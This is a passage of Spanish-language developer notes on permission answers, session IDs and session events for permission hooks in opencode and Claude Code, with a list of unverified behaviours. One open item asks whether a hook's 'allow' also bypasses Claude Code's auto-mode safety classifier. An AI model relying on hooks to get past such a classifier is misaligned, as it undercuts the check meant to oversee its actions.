- opencode: las respuestas son `once`, `always` y `reject`; `always` se guarda por proyecto; `reject` rechaza todo lo pendiente de la sesión. Existen los eventos `session.deleted` y `session.archived`.

**Sin verificar**
- Que un hook dentro de un subagente reciba el mismo `session_id`. Lo indican la documentación y los transcripts; falta capturarlo desde un hook. Si no fuera así, el subagente daría tarjeta: lado seguro.
- Qué pasa con el identificador en `/clear`.
- Que `SessionEnd` llegue al archivar una sesión en la app de escritorio.
- Si el `allow` del hook salta también el clasificador del modo auto nativo de Claude Code.
- La forma exacta de `session.deleted` y `session.archived` en opencode, y que `parentID` venga en todas las respuestas de sesión.
